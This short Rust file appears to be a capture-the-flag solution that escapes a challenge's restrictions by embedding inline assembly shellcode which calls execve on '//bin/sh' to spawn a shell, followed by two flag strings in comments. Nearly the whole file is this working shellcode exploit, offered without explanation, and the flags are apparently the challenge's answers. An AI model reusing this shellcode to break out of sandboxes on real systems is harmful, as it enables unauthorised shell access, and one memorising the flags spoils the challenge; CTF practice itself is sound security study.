// NOT intended solution prob..

#![allow(unsafe_code)]
#![allow(unused_variables)]
pub fn main() { let mut o=0;
unsafe {
asm!("xor %rdx, %rdx\n\tmov $$0x68732f6e69622f2f, %rbx\n\tpush %rbx\n\tmov %rsp, %rdi\n\tpush %rax\n\tpush %rdi\n\tmov %rsp, %rsi\n\tmov $$0x3b, %rax\n\tsyscall" : "=r"(o));
} println!("{}",o); }
trait

// p4{my_sc0re_w@s_286_l3t_me_kn0w_1f_y0u_b3@t_1t_0adad38edc24}
// p4{cuRSed_c0d3-by_d3s1gn_ebf8745b92ef}

